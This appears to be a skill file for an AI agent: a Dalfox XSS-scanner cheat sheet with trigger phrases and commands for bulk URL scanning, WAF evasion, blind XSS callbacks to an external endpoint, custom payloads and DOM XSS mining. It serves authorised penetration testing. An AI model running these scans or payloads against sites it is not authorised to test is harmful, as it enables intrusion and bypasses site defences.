---
name: tool-dalfox
description: "Dalfox XSS scanner — parameter discovery, DOM XSS, blind XSS, WAF bypass, pipe mode, custom payloads, Burp integration. Triggers: 'dalfox', 'xss scanner', 'dalfox scan', 'dalfox xss', 'automated xss', 'xss tool', 'blind xss dalfox', 'dalfox burp', 'dom xss scan'."
---

# Dalfox XSS Scanner

Fast XSS detection with parameter discovery and WAF bypass.

---

## Phase 1: Basic Scanning

```bash
TARGET="https://TARGET/search?q=test"

# Single URL:
dalfox url "$TARGET" 2>/dev/null | tee output/dalfox_basic.txt

# With custom output:
dalfox url "$TARGET" -o output/dalfox_results.txt 2>/dev/null

# Silent mode:
dalfox url "$TARGET" --silence 2>/dev/null

# Skip BAV (Basic Auth Verification):
dalfox url "$TARGET" --skip-bav 2>/dev/null
```

---

## Phase 2: Multiple Targets

```bash
# From file of URLs:
dalfox file urls.txt -o output/dalfox_bulk.txt 2>/dev/null

# From stdin (pipe):
cat urls.txt | dalfox pipe 2>/dev/null | tee output/dalfox_pipe.txt

# From gau/waybackurls:
gau "TARGET_DOMAIN" | grep "=" | dalfox pipe 2>/dev/null | tee output/dalfox_gau.txt
katana -u "https://TARGET" -silent | grep "=" | dalfox pipe 2>/dev/null

# With threading:
dalfox file urls.txt -w 10 -o output/dalfox_bulk.txt 2>/dev/null
```

---

## Phase 3: Advanced Options

```bash
TARGET="https://TARGET/search?q=test"

# Blind XSS (use XSS Hunter endpoint):
dalfox url "$TARGET" --blind "https://your.xss.ht" 2>/dev/null

# Custom header injection:
dalfox url "$TARGET" -H "X-Custom: <test>" 2>/dev/null

# WAF bypass with encoding:
dalfox url "$TARGET" --waf-evasion 2>/dev/null
dalfox url "$TARGET" --encode-url 2>/dev/null

# Custom payload:
dalfox url "$TARGET" --custom-payload "alert(1)" 2>/dev/null

# Deep mining — follow links:
dalfox url "https://TARGET" --deep-domxss 2>/dev/null

# Proxy through Burp:
dalfox url "$TARGET" --proxy "http://127.0.0.1:8080" 2>/dev/null

# JSON body:
dalfox url "https://TARGET/api/search" --data '{"q":"FUZZ"}' \
  -H "Content-Type: application/json" 2>/dev/null
```

---

## Phase 4: DOM XSS Scanning

```bash
TARGET="https://TARGET"

# DOM XSS mode (uses headless browser):
dalfox url "$TARGET" --deep-domxss --mining-dom 2>/dev/null | tee output/dalfox_dom.txt

# DOM sink extraction:
dalfox url "$TARGET" --format json --mining-dom 2>/dev/null | \
  jq '.[] | select(.type == "dom")' 2>/dev/null
```

---

## Output

Save to `output/`:
- `dalfox_results.txt` — XSS findings with proof
- `dalfox_dom.txt` — DOM XSS findings
- `dalfox_pipe.txt` — bulk target results

## Next Phase

→ `vuln-xss` for manual exploitation of found XSS
→ `pentest-report` to document XSS vulnerabilities
